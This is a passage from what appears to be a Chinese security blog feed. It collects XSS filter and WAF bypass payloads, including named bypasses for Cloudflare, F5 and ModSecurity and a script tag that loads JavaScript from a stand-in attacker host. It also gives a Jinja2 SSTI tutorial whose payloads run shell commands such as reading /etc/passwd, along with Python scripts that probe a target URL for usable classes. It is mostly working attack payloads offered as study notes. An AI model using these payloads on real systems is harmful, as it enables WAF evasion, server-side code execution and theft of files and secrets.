class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scrscriptipt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h2><p>利用eval()函数</p><p>与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">// 在js中，我们可以用反引号代替单双引号</span></span><br></pre></td></tr></table></figure><p><strong>编码绕过</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Unicode</span>编码绕过</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">javasc&amp;#x72;&amp;#x69;<span class="attr">pt</span>:<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)     (编码了r和i)</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url编码绕过</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Ascii</span>码绕过</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hex绕过</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=<span class="built_in">eval</span>(<span class="string">&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">base64绕过</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用url编码</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`</span>&gt;</span><br><span class="line"></span><br><span class="line">javasc&amp;#x72;&amp;#x69;<span class="attr">pt</span>:<span class="title function_">alert</span>(<span class="string">&#x27;xsshttp://&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">使用<span class="variable constant_">IP</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>十进制<span class="variable constant_">IP</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">`http://2130706433/`</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>八进制<span class="variable constant_">IP</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">`http://0177.0.0.01/`</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>hex</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">`http://0x7f.0x0.0x0.0x1/`</span>&gt;</span><br><span class="line"><span class="number">4.</span>html标签中用<span class="comment">//可以代替http://</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">`//www.baidu.com`</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>使用\\</span><br><span class="line">但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在<span class="title class_">Windows</span>下是file协议，在linux下才会是当前域的协议</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>使用中文逗号代替英文逗号</span><br><span class="line">如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;document.location=`http://www。baidu。com`&quot;</span>&gt;<span class="comment">//会自动跳转到百度</span></span><br></pre></td></tr></table></figure><h2 id="单引号闭合-htmlspecialchars函数绕过"><a href="#单引号闭合-htmlspecialchars函数绕过" class="headerlink" title="单引号闭合+htmlspecialchars函数绕过"></a>单引号闭合+htmlspecialchars函数绕过</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;onmouseover=&#x27;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure><h2 id="JavaScript伪协议"><a href="#JavaScript伪协议" class="headerlink" title="JavaScript伪协议"></a>JavaScript伪协议</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;   o_n和&lt;scr_ipt&gt;过滤</span></span><br></pre></td></tr></table></figure><h1 id="HttpOnly绕过"><a href="#HttpOnly绕过" class="headerlink" title="HttpOnly绕过"></a>HttpOnly绕过</h1><h1 id="常规waf绕过思路"><a href="#常规waf绕过思路" class="headerlink" title="常规waf绕过思路"></a>常规waf绕过思路</h1><ul><li>标签语法替换</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;<span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)&lt;/scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://attacker.org/malicious.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>特殊符号干扰</li><li>提交方式更改</li><li>垃圾数据溢出</li><li>加密解密算法</li><li>结合其他漏洞绕过</li></ul><p>下面的列表包含了可绕过的WAF、Paylaod以及相关的绕过技术</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>名称：<span class="title class_">Cloudflare</span></span><br><span class="line"><span class="title class_">Payload</span>：&lt;a”/onclick=(confirm)()&gt;click</span><br><span class="line">绕过技术：非空格填充</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>名称：<span class="title class_">Wordfence</span></span><br><span class="line"><span class="title class_">Payload</span>：&lt;a/href=javascript&amp;colon;<span class="title function_">alert</span>()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>名称：<span class="title class_">Barracuda</span></span><br><span class="line"><span class="title class_">Payload</span>：&lt;a/href=<span class="title class_">Java</span>%0a%0d%09script&amp;colon;<span class="title function_">alert</span>()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>名称：<span class="title class_">Comodo</span></span><br><span class="line"><span class="title class_">Payload</span>：&lt;d3v/onauxclick=(((confirm)))“&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>名称：<span class="variable constant_">F5</span></span><br><span class="line"><span class="title class_">Payload</span>：&lt;d3v/onmouseleave=[<span class="number">2</span>].<span class="title function_">some</span>(confirm)&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>名称：<span class="title class_">ModSecurity</span></span><br><span class="line"><span class="title class_">Payload</span>：&lt;details/open/ontoggle=<span class="title function_">alert</span>()&gt;</span><br><span class="line">绕过技术：黑名单中缺少标签或事件处理器</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>名称：dotdefender</span><br><span class="line"><span class="title class_">Payload</span>：&lt;details/open/ontoggle=(confirm)()<span class="comment">//</span></span><br><span class="line">绕过技术：黑名单中缺少结束标签、事件处理器和函数调用混淆</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI-模板注入</title>
      <link href="/2023/07/26/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/26/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><blockquote><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p></blockquote><ul><li>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</li></ul><h2 id="SSTI-模板注入"><a href="#SSTI-模板注入" class="headerlink" title="SSTI(模板注入)"></a>SSTI(模板注入)</h2><ul><li>SSTI 就是服务器端模板注入（Server-Side Template Injection）</li></ul><blockquote><p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p></blockquote><h2 id="判断SSTI类型"><a href="#判断SSTI类型" class="headerlink" title="判断SSTI类型"></a>判断SSTI类型</h2><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti_01.png" alt=""></p><h1 id="继承关系和魔术方法"><a href="#继承关系和魔术方法" class="headerlink" title="继承关系和魔术方法"></a>继承关系和魔术方法</h1><h2 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h2><p><strong>父类和子类</strong></p><p>子类调用父类下的其他子类</p><p>Python flask脚本没有办法直接执行python指令</p><ul><li>Object是父子关系的顶端，所有的数据类型最终的父类都是Object</li></ul><p><strong>举例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 子类（父类）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(<span class="title class_ inherited__">B</span>):<span class="keyword">pass</span></span><br><span class="line">c = C()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(c.__class__)<span class="comment"># &lt;class &#x27;__main__.C&#x27;&gt;当前类C</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__)<span class="comment"># &lt;class &#x27;__main__.B&#x27;&gt;当前类C的父类B</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__)<span class="comment"># &lt;class &#x27;__main__.A&#x27;&gt;父类的父类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__.__base__)<span class="comment"># &lt;class &#x27;object&#x27;&gt;层层递进</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__)<span class="comment"># (&lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)罗列所有父类关系C-&gt;B-&gt;A-&gt;Object</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__subclasses__())<span class="comment"># [&lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.D&#x27;&gt;]B下的所有子类（数组形式）</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__subclasses__()[<span class="number">1</span>])<span class="comment"># &lt;class &#x27;__main__.D&#x27;&gt;调用子类D</span></span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><blockquote><p><code>__class__</code> 查找当前类型的所属对象</p><p><code>__base__</code> 沿着父子类的关系往上走一个</p><p><code>__mro__</code> 查找当前类对象的所有继承类</p><p><code>__subclasses__</code> 查找父类下的所有子类</p><p><code>__init__</code> 查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现<strong>wrapper</strong>字眼，说明没有重载</p><p><code>__globals__</code> 函数会以字典的形式返回当前对象的全部全局变量</p></blockquote><p><strong>常用注入模块：</strong></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti_02.png" alt=""></p><h1 id="检查漏洞"><a href="#检查漏洞" class="headerlink" title="检查漏洞"></a>检查漏洞</h1><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja2_01.png" alt=""></p><p>利用<code>&#123;&#123;7*7&#125;&#125;</code>检查是否存在漏洞</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_02.png" alt=""></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_03.png" alt=""></p><p>用<code>&#123;&#123;''.__class__&#125;&#125;</code>试验一下：</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_04.png" alt=""></p><p>利用<code>&#123;&#123;''.__class__.__base__&#125;&#125;</code>找到父类：</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_05.png" alt=""></p><p>利用<code>&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;</code>将所有的子类找到：</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_06.png" alt=""></p><p>根据上面常用的注入模块找到目标模块：<code>&#123;&#123;''.__class__.__base__.__subclasses__()[117]&#125;&#125;</code></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_07.png" alt=""></p><p>利用<code>&#123;&#123;''.__class__.__base__.__subclasses__()[117].__init__&#125;&#125;</code>检查是否重载：</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_08.png" alt=""></p><p>没有<code>wrapper</code>，说明就已经重载，通过<code>&#123;&#123;''.__class__.__base__.__subclasses__()[117].__init__.__globals__&#125;&#125;</code>查看全部全局变量，有哪些可以使用的方法函数等</p><p>利用<code>&#123;&#123;''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code>查看具体数据：</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_09.png" alt=""></p><p>其中：</p><ul><li><code>__builtins__</code> 提供对Python的所有“内置”标识符的直接访问</li><li><code>eval()</code> 计算字符串表达式的值</li><li><code>popen()</code> 执行一个shell以运行命令来开启一个进程</li></ul><p>上述<code>payload</code>可替换成<code>&#123;&#123;''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('ls').read()&#125;&#125;</code></p><h1 id="常用注入模块"><a href="#常用注入模块" class="headerlink" title="常用注入模块"></a>常用注入模块</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><ul><li><code>__frozen__importlib__external.FileLoadser</code> 查找子类</li></ul><p>Python脚本，POST提交“name”的值，通过for循环查找所需字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;请输入URL链接：&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;__frozen__importlib_external.FileLoader&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span>  </span><br></pre></td></tr></table></figure><p>“name”具体写什么看网页源码：</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_10.png" alt=""></p><p><strong>FileLoader的利用</strong></p><p><code>[&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)</code> 调用get_data方法，传入参数0和文件路径</p><p><strong>读取配置文件下的FLAG</strong></p><p><code>&#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125;</code></p><p><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125;</code></p><h2 id="内建函数eval执行命令"><a href="#内建函数eval执行命令" class="headerlink" title="内建函数eval执行命令"></a>内建函数eval执行命令</h2><p><strong>内建函数：python在执行脚本时自动加载的函数</strong></p><p>python脚本查看可利用内建函数eval模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;请输入URL链接：&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p> <strong>“name”具体写什么看网页源码</strong></p><p><strong>Payload：</strong></p><p><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /etc/passwd").read()')&#125;&#125;</code></p><h2 id="os模块执行命令"><a href="#os模块执行命令" class="headerlink" title="os模块执行命令"></a>os模块执行命令</h2><p>在其他函数中直接调用os模块</p><ul><li><p>通过config，调用os</p><p><code>&#123;&#123;config.__class__.init__.__globals__['os'].popen('whoami').read()&#125;&#125;</code></p></li><li><p>通过url_for，调用os</p><p><code>&#123;&#123;url_for.__globals__.os.popen('whoami').read()&#125;&#125;</code></p></li><li><p>在已经加载os模块的子类里直接调用os模块</p><p><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__['os'].popen("ls -l /opt").read()&#125;&#125;</code></p></li></ul><p>python脚本查找已经加载os模块的子类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;请输入URL链接：&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;os.py&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="importlib类执行命令"><a href="#importlib类执行命令" class="headerlink" title="importlib类执行命令"></a>importlib类执行命令</h2><p>python脚本查找<code>_frozen_importlib.BuiltinImporter</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;请输入URL链接：&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    